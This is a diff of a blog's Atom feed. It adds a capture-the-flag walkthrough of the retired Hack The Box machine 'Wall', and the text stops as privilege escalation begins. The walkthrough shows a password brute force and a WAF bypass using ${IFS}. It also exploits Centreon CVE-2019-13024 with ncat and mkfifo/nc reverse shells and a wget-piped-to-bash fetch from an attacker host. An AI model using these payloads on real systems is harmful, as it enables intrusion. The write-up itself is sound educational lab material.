@@ -1,4 +1,356 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-11-30T16:03:17+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Heist</title><link href="https://0xrick.github.io/hack-the-box/heist/" rel="alternate" type="text/html" title="Hack The Box - Heist" /><published>2019-11-30T00:00:00+02:00</published><updated>2019-11-30T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/heist</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/heist/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-12-07T16:24:41+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Wall</title><link href="https://0xrick.github.io/hack-the-box/wall/" rel="alternate" type="text/html" title="Hack The Box - Wall" /><published>2019-12-07T00:00:00+02:00</published><updated>2019-12-07T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/wall</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/wall/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Hey guys, today Wall retired and here’s my write-up about it. It was an easy Linux machine with a web application vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;WAF&lt;/code&gt; bypass to be able to exploit that vulnerability and a vulnerable &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary. It’s a Linux machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;wall.htb&lt;/code&gt;. Let’s jump right in !&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/0.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# nmap -sV -sT -sC -o nmapinitial wall.htb 
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 13:59 EST
+Nmap scan report for wall.htb (10.10.10.157)
+Host is up (0.50s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 241.17 seconds
+root@kali:~/Desktop/HTB/boxes/wall# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22. Let’s check the web service.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;The index page was just the default &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt; page:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# gobuster dir -u http://wall.htb/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://wall.htb/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/12/06 14:08:02 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/monitoring (Status: 401)
+/server-status (Status: 403)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;The only interesting thing was &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring&lt;/code&gt;, however that path was protected by basic &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; authentication:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I didn’t have credentials, I tried bruteforcing them but it didn’t work so I spent sometime enumerating but I couldn’t find the credentials anywhere. Turns out that by changing the request method from &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; we can bypass the authentication:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# curl -X POST http://wall.htb/monitoring/
+&amp;lt;h1&amp;gt;This page is not ready yet !&amp;lt;/h1&amp;gt;
+&amp;lt;h2&amp;gt;We should redirect you to the required page !&amp;lt;/h2&amp;gt;
+
+&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL='/centreon'&quot; /&amp;gt;
+
+root@kali:~/Desktop/HTB/boxes/wall# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;The response was a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/centreon&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Centreon is a network, system, applicative supervision and monitoring tool. -&lt;a href=&quot;https://github.com/centreon/centreon&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;Bruteforcing the credentials through the login form will require writing a script because there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;csrf&lt;/code&gt; token that changes every request, alternatively we can use the &lt;a href=&quot;https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt;&lt;/a&gt;. 
+&lt;br /&gt;According to the &lt;a href=&quot;https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication&quot;&gt;authentication&lt;/a&gt; part we can send a &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; request to &lt;code class=&quot;highlighter-rouge&quot;&gt;/api/index.php?action=authenticate&lt;/code&gt; with the credentials. In case of providing valid credentials it will respond with the authentication token, otherwise it will respond with a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt;. 
+&lt;br /&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;darkweb2017-top10000.txt&lt;/code&gt;&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# wfuzz -c -X POST -d &quot;username=admin&amp;amp;password=FUZZ&quot; -w ./darkweb2017-top10000.txt http://wall.htb/centreon/api/index.php?action=authenticate
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+Target: http://wall.htb/centreon/api/index.php?action=authenticate
+Total requests: 10000
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+000000005:   403        0 L      2 W      17 Ch       &quot;qwerty&quot;
+000000006:   403        0 L      2 W      17 Ch       &quot;abc123&quot;
+000000008:   200        0 L      1 W      60 Ch       &quot;password1&quot;
+000000004:   403        0 L      2 W      17 Ch       &quot;password&quot;
+000000007:   403        0 L      2 W      17 Ch       &quot;12345678&quot;
+000000009:   403        0 L      2 W      17 Ch       &quot;1234567&quot;
+000000010:   403        0 L      2 W      17 Ch       &quot;123123&quot;
+000000001:   403        0 L      2 W      17 Ch       &quot;123456&quot;
+000000002:   403        0 L      2 W      17 Ch       &quot;123456789&quot;
+000000003:   403        0 L      2 W      17 Ch       &quot;111111&quot;
+000000011:   403        0 L      2 W      17 Ch       &quot;1234567890&quot;
+000000012:   403        0 L      2 W      17 Ch       &quot;000000&quot;
+000000013:   403        0 L      2 W      17 Ch       &quot;12345&quot;
+000000015:   403        0 L      2 W      17 Ch       &quot;1q2w3e4r5t&quot; 
+^C
+Finishing pending requests...
+root@kali:~/Desktop/HTB/boxes/wall# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;password1&lt;/code&gt; resulted in a &lt;code class=&quot;highlighter-rouge&quot;&gt;200&lt;/code&gt; response so its the right password:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;rce--waf-bypass--shell-as-www-data&quot;&gt;RCE | WAF Bypass –&amp;gt; Shell as www-data&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;I checked the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;centreon&lt;/code&gt; and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;19.04&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/6.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;It was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2019-13024&lt;/code&gt;, discovered by the &lt;a href=&quot;https://github.com/mhaskar&quot;&gt;author of the box&lt;/a&gt;) and there was an exploit for it:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# searchsploit centreon
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                                                                                                    |  Path
+                                                                                                                                                                                                  | (/usr/share/exploitdb/)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+----------
+ Redacted
+----------
+Centreon 19.04  - Remote Code Execution                                                                                                                                                           | exploits/php/webapps/47069.py
+----------
+ Redacted
+----------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+root@kali:~/Desktop/HTB/boxes/wall# 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;But when I tried to run the exploit I didn’t get a shell:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;So I started looking at the exploit code and tried to do it manually. 
+&lt;br /&gt;The vulnerability is in the poller configuration page (&lt;code class=&quot;highlighter-rouge&quot;&gt;/main.get.php?p=60901&lt;/code&gt;) :&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;poller_configuration_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/main.get.php?p=60901&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;The script attempts to configure a poller and this is the payload that’s sent in the &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; request:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;payload_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Central&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;ns_ip_address&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# this value should be 1 always&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;localhost[localhost]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;is_default[is_default]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;remote_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;ssh_port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;22&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;init_script&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;centengine&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# this value contains the payload , you can change it as you want&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;nagios_bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ncat -e /bin/bash {0} {1} #&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;nagiostats_bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/sbin/centenginestats&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;nagios_perfdata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/var/log/centreon-engine/service-perfdata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;centreonbroker_cfg_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/etc/centreon-broker&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;centreonbroker_module_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/centreon/lib/centreon-broker&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;centreonbroker_logs_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;centreonconnector_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/lib64/centreon-connector&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;init_script_centreontrapd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;centreontrapd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;snmp_trapd_path_conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/etc/snmp/centreon_traps/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;ns_activate[ns_activate]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;submitC&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Save&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;centreon_token&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poller_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+
+
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nagios_bin&lt;/code&gt; is the vulnerable parameter:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;c&quot;&gt;# this value contains the payload , you can change it as you want&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;nagios_bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ncat -e /bin/bash {0} {1} #&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I checked the configuration page and looked at the &lt;code class=&quot;highlighter-rouge&quot;&gt;HTML&lt;/code&gt; source, &lt;code class=&quot;highlighter-rouge&quot;&gt;nagios_bin&lt;/code&gt; is the monitoring engine binary, I tried to inject a command there:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/8.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+When I tried to save the configuration I got a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/9.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;That’s because there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;WAF&lt;/code&gt; blocking these attempts, I could bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;WAF&lt;/code&gt; by replacing the spaces in the commands with &lt;a href=&quot;https://en.wikipedia.org/wiki/Internal_field_separator&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;&lt;/a&gt;. I saved the reverse shell payload in a file then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; to get the file contents and I piped it to &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt;.
+&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;modified parameter:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;nagios_bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wget${IFS}-qO-${IFS}http://10.10.xx.xx/a${IFS}|${IFS}bash;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# python exploit.py http://wall.htb/centreon/ admin password1 10.10.xx.xx 1337
+[+] Retrieving CSRF token to submit the login form
+exploit.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (&quot;lxml&quot;). This usually isn't a problem, but if you run this code on another system, or in a different virtual e
+nvironment, it may use a different parser and behave differently.
+
+The code that caused this warning is on line 38 of the file exploit.py. To get rid of this warning, pass the additional argument 'features=&quot;lxml&quot;' to the BeautifulSoup constructor.
+
+  soup = BeautifulSoup(html_content)
+[+] Login token is : ba28f431a995b4461731fb394eb01d79
+[+] Logged In Sucssfully
+[+] Retrieving Poller token
+exploit.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (&quot;lxml&quot;). This usually isn't a problem, but if you run this code on another system, or in a different virtual e
+nvironment, it may use a different parser and behave differently.
+
+The code that caused this warning is on line 56 of the file exploit.py. To get rid of this warning, pass the additional argument 'features=&quot;lxml&quot;' to the BeautifulSoup constructor.
+
+  poller_soup = BeautifulSoup(poller_html)
+[+] Poller token is : d5702ae3de1264b0692afcef86074f07
+[+] Injecting Done, triggering the payload
+[+] Check your netcat listener !
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/wall# nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.157] 37862
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ which python             
+/usr/bin/python
+$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+www-data@Wall:/usr/local/centreon/www$ ^Z
+[1]+  Stopped                 nc -lvnp 1337
+root@kali:~/Desktop/HTB/boxes/wall# stty raw -echo 
+root@kali:~/Desktop/HTB/boxes/wall# nc -lvnp 1337
+
+www-data@Wall:/usr/local/centreon/www$ export TERM=screen
+www-data@Wall:/usr/local/centreon/www$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;screen-450--root-shell--user--root-flags&quot;&gt;Screen 4.5.0 –&amp;gt; Root Shell –&amp;gt; User &amp;amp; Root Flags&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;There were two users on the box, &lt;code class=&quot;highlighter-rouge&quot;&gt;shelby&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sysmonitor&lt;/code&gt;. I couldn’t read the user flag as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Wall:/usr/local/centreon/www$ cd /home
+www-data@Wall:/home$ ls -al
+total 16
